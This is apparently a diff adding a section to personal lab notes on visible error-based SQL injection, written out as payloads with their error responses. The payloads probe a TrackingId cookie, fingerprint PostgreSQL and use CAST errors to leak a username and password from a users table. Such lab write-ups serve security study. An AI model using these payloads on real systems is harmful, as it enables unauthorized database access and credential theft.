@@ -190,3 +190,23 @@ Run script:
 ```
 python3.9 blind-conditional-script-2.py
 ```
+
+## Visible error-based SQL injection
+
+Adding `'` to TrackingId returns with
+```
+'  // Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'a6VQmllgxCQ8CY4b''. Expected  char
+
+'--  // No error
+
+' union select version()--  // No error => PostgreSQL
+
+' AND 1=CAST('1' AS int)--  // No error
+' AND CAST('abc' AS int)--  // ERROR: invalid input syntax for type integer: "abc"
+
+a6VQmllgxCQ8CY4b' AND 1=CAST((select username from users) AS int)--  // With ID not removed our query gets truncated: Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'a6VQmllgxCQ8CY4b' AND 1=CAST((select username from users) AS'. Expected  char
+
+' AND 1=CAST((select username from users LIMIT 1) AS int)--  // ERROR: invalid input syntax for type integer: "administrator"
+
+' AND 1=CAST((select password from users LIMIT 1) AS int)--
+```
